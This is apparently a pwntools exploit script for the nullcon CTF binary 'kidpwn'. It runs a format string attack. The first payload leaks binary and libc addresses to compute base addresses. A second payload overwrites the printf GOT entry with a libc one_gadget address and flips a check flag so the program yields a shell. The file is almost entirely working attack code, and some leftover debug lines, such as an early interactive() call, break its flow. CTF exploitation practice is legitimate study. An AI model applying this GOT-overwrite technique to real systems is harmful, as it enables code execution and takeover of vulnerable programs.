from pwn import *
# import re
# from IPython import embed
# from fmtstr_builder import FmtStrBuilder


context.binary = "./kidpwn"
context.terminal = ["guake", "--split-vertical", "-e"]
libc = ELF("./libc-2.23.so")
elf = ELF("./kidpwn")


# p = remote("pwn2.ctf.nullcon.net", 5003)
p = process(["./ld-2.23.so", "./kidpwn"], env={"LD_PRELOAD": "./libc-2.23.so"})

gdb.attach(p)

base = p.libs()["/home/esc/ctf/nullcon/kidpwn/kidpwn"]
# gdbscript = f"""
# display/3gx ({base} + 0x201000 + 0x5c - 4)
# display/3gx ({base} + 0x201000 + 0x30 - 8)

# # Before printf
# b *({base} + 0x97a)

# # After printf
# b *({base} + 0x97f)

# c
# set (*(long *)($rsp + 0x38)) = ($rsp - 0x8)
# """
# gdb.attach(p, gdbscript=gdbscript)

printf_buffer_size = 0x48 + 0x30
p.sendline("%d" % (printf_buffer_size))

# =========================
# FIRST PRINTF
# =========================
s = "%05c%13$hhn%38$p%39$p".ljust(0x38, "A") + "\x08"
print(s)
p.send(s)
s = p.recvuntil("AAAAAAA")
m = re.search(b"(0x.*?)(0x.*?)A", s)

addr_in_binary = int(m.group(1), 16)
libc_ret_addr = int(m.group(2), 16)

elf.address = (addr_in_binary >> 12) << 12
libc.address = libc_ret_addr - 0x20830
bss = elf.address + 0x201000
CHECKED_IF_ZERO = bss + 0x5C

one_gadget = libc.address + 0x45216
print(s)
p.interactive()
# one_gadget = libc.address + 0x4526a
# one_gadget = libc.address + 0xf02a4
# one_gadget = libc.address + 0xf1147

# Other options for one gadget
# 0x4526a
# 0xf02a4
# 0xf1147

# print(f"addr in binary:     {addr_in_binary:x}")
# print(f"libc ret addr:      {libc_ret_addr:x}")
# print(f"binary base addr:   {elf.address:x}")
# print(f"libc base address:  {libc.address:x}")

# base_va: is the vararg that corresponds to the start of the format string
#          buffer on the stack.
# 0x7f: Indicates the length of the format string buffer on the stack
builder = FmtStrBuilder(6, printf_buffer_size)
# The value given in `address` gets added to the end of the format string
a = elf.got["printf"]
builder.write_short(one_gadget & 0xFFFF, address=a)
builder.write_short((one_gadget >> 16) & 0xFFFF, address=a + 2)
builder.write_short((one_gadget >> 32) & 0xFFFF, address=a + 4)
builder.write_short((one_gadget >> 48) & 0xFFFF, address=a + 6)
builder.write_byte(1, address=CHECKED_IF_ZERO)

# embed()

# writes = {
#     elf.got["read"]: one_gadget,
#     CHECKED_IF_ZERO: 0xff,
# }
# s = fmtstr.fmtstr_payload(6, writes, write_size="short")
# assert len(builder.fmtstr) < printf_buffer_size

# print(f"Sending fmtstr payload {s}")

p.send(builder.fmtstr)

p.interactive()
